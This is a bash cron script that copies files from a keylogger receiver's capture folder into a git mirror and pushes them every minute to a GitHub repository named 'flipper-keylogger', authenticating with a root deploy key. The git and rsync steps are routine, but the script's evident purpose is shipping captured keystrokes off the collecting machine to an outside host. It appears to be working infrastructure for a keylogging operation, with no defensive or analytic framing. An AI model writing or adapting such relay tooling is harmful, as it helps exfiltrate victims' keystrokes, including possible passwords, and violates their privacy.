#!/usr/bin/env bash
# Sync /opt/kl-recv/captures → GitHub every minute (cron).
# Auth: deploy key at /root/.ssh/kl_github_deploy
set -euo pipefail

REPO_DIR="${KL_REPO_DIR:-/opt/kl-recv/git-mirror}"
CAPTURE_SRC="${KL_CAPTURES:-/opt/kl-recv/captures}"
REMOTE_URL="${KL_GIT_REMOTE:-git@github.com:naturalniyaboba2077/flipper-keylogger.git}"
BRANCH="${KL_GIT_BRANCH:-main}"
SSH_KEY="${KL_SSH_KEY:-/root/.ssh/kl_github_deploy}"
LOG="${KL_SYNC_LOG:-/var/log/kl-github-sync.log}"

export GIT_SSH_COMMAND="ssh -i ${SSH_KEY} -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/root/.ssh/known_hosts"

ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }

log() { echo "$(ts) $*" >>"$LOG"; }

mkdir -p "$(dirname "$LOG")"

if [[ ! -f "$SSH_KEY" ]]; then
  log "FAIL no deploy key $SSH_KEY"
  exit 1
fi

if [[ ! -d "$REPO_DIR/.git" ]]; then
  log "clone $REMOTE_URL"
  rm -rf "$REPO_DIR"
  git clone --depth 50 -b "$BRANCH" "$REMOTE_URL" "$REPO_DIR" >>"$LOG" 2>&1 || {
    log "clone fail"
    exit 1
  }
fi

cd "$REPO_DIR"
git fetch origin "$BRANCH" >>"$LOG" 2>&1 || true
git checkout "$BRANCH" >>"$LOG" 2>&1 || git checkout -B "$BRANCH" >>"$LOG" 2>&1
git reset --hard "origin/$BRANCH" >>"$LOG" 2>&1 || true

mkdir -p captures
# mirror tree (no delete of remote-only history files we keep)
rsync -a --exclude '.git' "$CAPTURE_SRC"/ captures/ >>"$LOG" 2>&1

git config user.email "kl-sync@local"
git config user.name "kl-github-sync"

git add -A captures

if git diff --cached --quiet; then
  log "noop no changes"
  exit 0
fi

COUNT=$(git diff --cached --numstat | wc -l | tr -d ' ')
git commit -m "captures: sync $(ts) (${COUNT} paths)" >>"$LOG" 2>&1 || {
  log "commit fail"
  exit 1
}

# pull --rebase then push; retry once
if ! git pull --rebase origin "$BRANCH" >>"$LOG" 2>&1; then
  log "rebase warn — continue push"
fi

if git push origin "$BRANCH" >>"$LOG" 2>&1; then
  log "ok pushed"
else
  log "FAIL push"
  exit 1
fi
